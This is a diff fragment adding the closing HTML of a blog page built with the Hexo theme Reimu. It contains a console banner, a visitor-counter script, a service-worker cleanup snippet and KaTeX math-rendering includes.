+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
